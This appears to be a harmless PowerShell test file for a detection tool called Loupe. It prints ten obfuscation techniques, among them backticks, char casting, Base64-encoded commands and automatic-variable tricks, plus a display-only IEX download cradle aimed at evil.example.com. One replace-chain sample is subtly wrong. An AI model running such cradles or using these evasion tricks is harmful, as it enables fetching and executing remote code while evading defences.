# === Loupe Test File: PowerShell Obfuscation Examples ===
# This file contains various PowerShell obfuscation techniques for testing detection.
# WARNING: This is a HARMLESS test file. No actual malicious actions are performed.

# ── Technique 1: String Concatenation ──
# Break keywords into fragments joined with +
Write-Host "[TEST] String concatenation obfuscation:"
$cmd1 = 'Inv' + 'oke' + '-Web' + 'Req' + 'uest'
$cmd2 = "Dow" + "nlo" + "adS" + "tri" + "ng"
Write-Host "Built: $cmd1 and $cmd2"

# ── Technique 2: Backtick Escape ──
# Insert backticks to break keyword recognition
Write-Host "[TEST] Backtick obfuscation:"
$example = "In`v`o`k`e-Ex`pr`es`si`on"
$example2 = "Ne`w`-O`b`je`ct Sy`st`em.Ne`t.We`b`Cl`ie`nt"
Write-Host "Built: $example"
Write-Host "Built: $example2"

# ── Technique 3: Format Operator (-f) ──
# Use -f to reconstruct strings from positional arguments
Write-Host "[TEST] Format operator obfuscation:"
$fmt = '{0}{1}{2}{3}' -f 'Invoke','-Web','Requ','est'
$fmt2 = '{0}{1}{2}' -f 'Net.','WebCl','ient'
Write-Host "Built: $fmt"
Write-Host "Built: $fmt2"

# ── Technique 4: [char] Type Casting ──
# Build strings character by character from ASCII codes
Write-Host "[TEST] Char casting obfuscation:"
$charCmd = [char]73 + [char]69 + [char]88 + [char]32 + [char]40 + [char]78 + [char]101 + [char]119
Write-Host "Built chars: $charCmd"

# ── Technique 5: String Reversal ──
# Write the string backwards, then reverse it at runtime
Write-Host "[TEST] String reversal obfuscation:"
$reversed = 'llehsrewop'
$original = -join ($reversed[-1..-($reversed.Length)])
Write-Host "Reversed back: $original"

# ── Technique 6: -replace Chain ──
# Use substitution chains to transform encoded strings
Write-Host "[TEST] Replace chain obfuscation:"
$encoded = 'XnvXke-ExXressiXn' -replace 'X','o' -replace 'o','o' -replace 'XressiXn','pression'
$encoded2 = 'D0wnl0adStr1ng' -replace '0','o' -replace '1','i' -replace 'ng','ng'
Write-Host "Replaced: $encoded"
Write-Host "Replaced: $encoded2"

# ── Technique 7: IEX Obfuscation ──
# Various ways to invoke IEX without spelling it out
Write-Host "[TEST] IEX obfuscation:"
$iexVar = 'iex'
# sal creates an alias: sal x iex
# .('i'+'e'+'x') concatenates and invokes
$iexConcat = 'i' + 'e' + 'x'
Write-Host "IEX alias techniques: $iexConcat"

# ── Technique 8: Encoded Command ──
# Base64-encoded PowerShell commands
Write-Host "[TEST] Encoded command:"
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'Hello from encoded test'"))
Write-Host "Encoded payload: powershell -EncodedCommand $b64"

# ── Technique 9: Download Cradle with obfuscation ──
Write-Host "[TEST] Obfuscated download cradle:"
$cradle = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/payload.ps1')"
Write-Host "Cradle (display only): $cradle"

# ── Technique 10: Automatic-variable index abuse ──
# Pull characters from the *default* value of well-known automatic
# variables. `$VerbosePreference` is `SilentlyContinue` on a stock
# install — characters 1 and 3 are `i` and `e`, so
# `$VerbosePreference.toString()[1,3] + 'x' -join ''` reconstructs `iex`
# without ever spelling it. `$PSHOME` is the Windows PowerShell install
# path; characters 4 and 34 build another two-letter cmdlet alias.
Write-Host "[TEST] Automatic-variable index abuse:"
$autoIex   = $VerbosePreference.toString()[1,3] + 'x' -join ''
$autoBuilt = $PSHOME[4]+$PSHOME[34]+'x'
Write-Host "Built from `$VerbosePreference: $autoIex"
Write-Host "Built from `$PSHOME: $autoBuilt"

Write-Host ""
Write-Host "[DONE] All PowerShell obfuscation test patterns rendered."
